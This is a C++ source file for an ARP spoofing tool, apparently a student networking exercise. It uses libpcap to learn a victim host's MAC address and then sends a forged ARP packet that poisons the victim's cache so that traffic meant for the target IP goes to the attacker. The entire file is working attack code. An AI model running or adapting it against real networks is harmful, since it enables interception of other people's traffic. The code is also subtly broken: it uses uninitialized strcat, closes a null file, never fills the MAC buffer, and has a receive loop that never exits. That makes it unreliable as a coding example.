#include <arpa/inet.h>
#include <cstdio>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <unistd.h>
#include "arphdr.h"
#include "ethhdr.h"
#include "myarpspoof.h"

#pragma pack(push, 1)
struct EthArpPacket final {
        EthHdr eth_;
        ArpHdr arp_;
};
#pragma pack(pop)

bool My_Mac_Address(char * Mac_store, char * interface)
{
	FILE * fp;
	char * path = (char*)malloc(sizeof(char)*(23+strlen(interface)));	
	if(path == NULL)
		return 0;
	
	strcat(path,"/sys/class/net/");
	strcat(path,interface);
	strcat(path,"/address");
	
	fp =fopen(path,"rb");
	if(!fp)
	{
		free(path);
		fclose(fp);
		return 0;
	}
	
	fread(Mac_store, 18,1,fp);	

	free(path);
	fclose(fp);
	return 1;
}
void My_Ip_Address(char* Ip_store, char* interface)
{
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	strncpy(Ip_store, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), 16);
	close(fd);
	return;
}
bool get_sender_mac(const u_char * packet, char * sender_ip, char * sender_mac)
{
	EthArpPacket* header = (EthArpPacket*)packet;
	printf("%s\n", header->arp_.sip_);
	return 1;
}
bool check_ip(char* test_ip)
{
	uint8_t a, b, c, d;
	uint8_t res = sscanf(test_ip, "%hhu.%hhu.%hhu.%hhu", &a, &b, &c, &d);
	if (res != 4)
	{
		fprintf(stderr, "%s does not match IP format\n", test_ip);
		return 0;
	}
	return 1;
}
bool Send_ARP_Request(pcap_t *pcap, ip_mac * mine, char * sender_ip)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(mine->my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(mine->my_mac);
    packet.arp_.sip_ = htonl(Ip(mine->my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			return 0;
    }
	
	return 1;
}
bool Receive_ARP_Reply(char * my_interface, char * sender_ip, char * sender_mac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* pcap = pcap_open_live(my_interface, BUFSIZ, 1, 1000, errbuf);
        if (pcap == NULL) {
                fprintf(stderr, "pcap_open_live(%s) return null - %s\n", my_interface, errbuf);
        return 0;
        }
	struct pcap_pkthdr* header;
	const u_char* packet;
	int32_t res;
	do {
		res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			return 0;
		}
	}
	while (get_sender_mac(packet, sender_ip, sender_mac));
	pcap_close(pcap);
	return 1;
}
void Attack_ARP(pcap_t * pcap,char * sender_ip, char * target_ip, char * sender_mac,ip_mac * mine)
{
		EthArpPacket packet;

        packet.eth_.dmac_ = Mac(sender_mac);
        packet.eth_.smac_ = Mac(mine->my_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(mine->my_mac);
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.tmac_ = Mac(sender_mac);
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }

        return;
}
void my_arp_spoof(char * my_interface, char * sender_ip, char * target_ip, ip_mac * mine)
{
	if (!check_ip(sender_ip) || !check_ip(target_ip))
		return;
	
	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t* pcap = pcap_open_live(my_interface, BUFSIZ, 1, 1000, errbuf);
    	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", my_interface, errbuf);
        return;
    	}

	char sender_mac[18];

	if (!Send_ARP_Request(pcap, mine, sender_ip)) //sender MAC 주소 요청
		return;

	if (!Receive_ARP_Reply(my_interface, sender_ip,sender_mac))//source MAC 주소 알아내기
		return;
	
	Attack_ARP(pcap,sender_ip,target_ip,sender_mac,mine);	// 공격

	printf("from %s to %s arp spoof successes\n",sender_ip, target_ip);
	
	pcap_close(pcap);
	
	return;
}
